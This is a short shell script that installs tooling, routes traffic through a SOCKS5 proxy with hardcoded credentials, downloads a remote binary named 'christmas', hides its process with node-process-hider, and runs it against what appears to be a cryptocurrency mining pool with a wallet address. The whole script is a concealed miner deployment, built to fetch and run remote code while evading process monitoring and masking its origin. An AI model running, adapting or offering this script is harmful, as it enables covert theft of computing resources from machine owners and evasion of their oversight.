apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


wget https://golang.org/dl/go1.16.6.linux-amd64.tar.gz
tar -xvzf go1.16.6.linux-amd64.tar.gz
export PATH=$PATH:~/go/bin
source $HOME/.profile
rm go1.16.6.linux-amd64.tar.gz

git clone https://github.com/hmgle/graftcp.git
cd graftcp
make
cd

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 54.193.63.240:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/christmas
chmod +x christmas

ph add christmas

./graftcp/graftcp ./christmas -a gr -o raptorna.011data.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAzAz -p IhatePopUps

